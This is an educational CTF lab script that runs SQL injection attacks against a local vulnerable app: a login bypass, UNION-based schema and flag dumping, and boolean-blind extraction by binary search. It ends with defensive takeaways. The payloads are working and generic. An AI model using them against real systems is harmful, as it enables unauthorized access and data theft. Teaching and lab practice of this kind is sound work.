"""
CTF Lab Solver — SQL Injection walkthrough against ctf_lab.vulnerable_app
=========================================================================

Educational script: it demonstrates, step by step, three classic injection
classes against the local lab server. Run it only while the lab app
(`python -m ctf_lab.vulnerable_app`) is up on 127.0.0.1:5353.

    python -m ctf_lab.sqli_solver            # defaults to 127.0.0.1:5353
    python -m ctf_lab.sqli_solver --target http://127.0.0.1:5353

Three lessons:
  1. demo_auth_bypass       — append a quote + comment marker to skip auth
  2. demo_union_extraction  — column probing -> sqlite_master enumeration -> dump
  3. demo_blind_extraction  — yes/no oracle + binary search (7 reqs/char)
"""
import argparse

import requests

# `-- ` terminates the rest of the SQL statement in SQLite (and in MySQL,
# where the trailing space must be kept exactly like this).
COMMENT = "-- "


def _get(base, path, params):
    try:
        return requests.get(f"{base}{path}", params=params, timeout=5)
    except requests.RequestException as exc:
        raise SystemExit(f"[!] Lab server unreachable at {base} — start it with "
                         f"`python -m ctf_lab.vulnerable_app` first.\n    ({exc})")


def _hr(title):
    print(f"\n{'=' * 66}\n{title}\n{'=' * 66}")


# ── Lesson 1: authentication bypass ──────────────────────────────────────
def demo_auth_bypass(base):
    _hr("Lesson 1 — Authentication bypass (error-tolerant concatenation)")
    # Payload "admin' -- " produces:
    #     ... WHERE username = 'admin' --' AND password = 'nope'
    # Everything after `--` is discarded, so the password check disappears
    # and the row for `admin` is returned as if login had succeeded.
    r = requests.post(f"{base}/login",
                      json={"username": "admin" + "'" + " " + COMMENT,
                            "password": "nope"},
                      timeout=5)
    print(f"[*] POST /login  username=admin' --   password=nope")
    print(f"    -> {r.status_code} {r.json()}")

    # Second flavor: force the WHERE clause to be true for *every* row.
    #     ... WHERE username = 'x' OR 1=1 -- <= password check commented out
    r = requests.post(f"{base}/login",
                      json={"username": f"x' OR 1=1 {COMMENT}", "password": "nope"},
                      timeout=5)
    print(f"[*] POST /login  username=x' OR 1=1 --   password=nope")
    print(f"    -> {r.status_code} {r.json()}   (first matching row wins)")


# ── Lesson 2: UNION-based extraction ─────────────────────────────────────
def discover_column_count(base):
    """Probe how many result columns /user's SELECT returns.

    UNION SELECT with fewer/more columns than the outer query is an engine
    error (HTTP 400 here). Binary search is unnecessary — a linear probe
    from 1 upward stops precisely at the right count.
    """
    for n in range(1, 13):
        cols = ",".join(["NULL"] * n)
        r = _get(base, "/user", {"username": f"' UNION SELECT {cols} {COMMENT}"})
        if r.status_code == 200:
            return n
    return None


def union_dump(base, n_cols, select_expr, table, where=""):
    """Build a UNION payload that drops arbitrary rows into /user's output.

    Column 2 lands in the reflected `username` field and column 3 in
    `email`, so we route the interesting data there.
    """
    row_values = ["NULL"] * n_cols
    if len(row_values) >= 2:
        row_values[0] = "1"
        row_values[1] = select_expr
    else:
        row_values[0] = select_expr
    payload = f"' UNION SELECT {','.join(row_values)} FROM {table} {where} {COMMENT}"
    r = _get(base, "/user", {"username": payload})
    return r.status_code, r.json()


def demo_union_extraction(base):
    _hr("Lesson 2 — UNION-based SQLi (in-band: data reflected in responses)")

    n_cols = discover_column_count(base)
    print(f"[*] Column-count probe (UNION NULL technique): "
          f"{n_cols} columns in the outer SELECT")
    if not n_cols:
        print("[!] Could not determine column count — stopping.")
        return

    # Unknown-schema step: enumerate tables from SQLite's catalog.
    # (In MySQL you'd interrogate information_schema.tables instead.)
    status, rows = union_dump(base, n_cols, "name", "sqlite_master",
                              where="WHERE type='table'")
    print(f"[*] Schema enumeration via sqlite_master:")
    for row in rows:
        print(f"    table -> {row.get('username') or row.get('email')}")

    # Data exfiltration: route value/description into reflected columns.
    print("[*] Dumping secret_flag via UNION:")
    for flag_id in (1, 2):
        status, rows = union_dump(base, n_cols, "value", "secret_flag",
                                  where=f"WHERE id = {flag_id}")
        for row in rows:
            print(f"    id={flag_id}  value={row.get('username')}  "
                  f"({row.get('email')})")
    return rows


# ── Lesson 3: boolean-blind extraction ───────────────────────────────────
def _oracle(condition, base):
    """True iff `condition` evaluates truthy inside the /check query.

    Payload:  ' OR (<condition>) --
    becomes:  WHERE username = '' OR (<condition>) -- <= rest is discarded.

    The COUNT over `users` then reports >0 exactly when `condition` holds —
    that single bit of information is the whole oracle.
    (An `admin' AND (...) --` variant works too, provided `admin` exists.)
    """
    payload = f"' OR ({condition}) {COMMENT}"
    r = _get(base, "/check", {"username": payload})
    return bool(r.json().get("exists"))


def blind_extract(base, expr, max_len=64):
    """Extract a scalar string one character at a time.

    expr — a subquery evaluating to TEXT, e.g.
           "SELECT value FROM secret_flag WHERE id = 1"

    Per character we ask at most 7 yes/no questions using binary search over
    printable ASCII (32..126): `unicode(substr(...)) > mid`? A linear sweep
    would need ~95 requests per character; binary search needs ~7, and the
    `length() >= pos` pre-check stops cleanly at the end of the string.
    """
    slow_expr = expr  # shown in comments for readability
    chars = []
    pos = 1
    while pos <= max_len:
        # Stop when the string is shorter than `pos`.
        if not _oracle(f"length(({expr})) >= {pos}", base):
            break
        lo, hi = 32, 127  # chr(hi) is exclusive bound
        while lo < hi:
            mid = (lo + hi) // 2
            if _oracle(f"unicode(substr(({expr}), {pos}, 1)) > {mid}", base):
                lo = mid + 1
            else:
                hi = mid
        chars.append(chr(lo))
        pos += 1
    return "".join(chars)


def demo_blind_extraction(base):
    _hr("Lesson 3 — Boolean-blind SQLi (extracting data with zero reflection)")

    # Warm-up: confirm a table exists by asking yes/no questions.
    known = _oracle("EXISTS (SELECT 1 FROM sqlite_master "
                    "WHERE type='table' AND name='secret_flag')", base)
    print(f"[*] Oracle check: table secret_flag exists? {known}")

    flag = blind_extract(base, "SELECT value FROM secret_flag WHERE id = 1")
    desc = blind_extract(base,
                         "SELECT description FROM secret_flag WHERE id = 1")
    print(f"[+] blind-extracted value:       {flag}")
    print(f"[+] blind-extracted description: {desc}")
    print("[*] Cross-check these against Lesson 2's UNION dump — they must match.")


def main():
    ap = argparse.ArgumentParser(description="CTF lab SQLi walkthrough "
                                             "(lab-only; mock data).")
    ap.add_argument("--target", default="http://127.0.0.1:5353",
                    help="Base URL of the local vulnerable_app instance")
    ap.add_argument("--max-len", type=int, default=64,
                    help="Safety cap on blind extraction length")
    args = ap.parse_args()

    demo_auth_bypass(args.target)
    demo_union_extraction(args.target)
    demo_blind_extraction(args.target)

    _hr("Done — key takeaways")
    print("""\
1. Concatenating input into SQL lets input change the query's *structure*.
2. Parameterized statements (?-placeholders) prevent this: data stays data.
3. Any observable difference (rows, errors, timing, true/false) can be
   turned into a data-extraction channel.
4. Defense in depth: parameterized queries + least-privilege DB accounts +
   error minimization + input validation as hardening, never as the fix.
""")


if __name__ == "__main__":
    main()
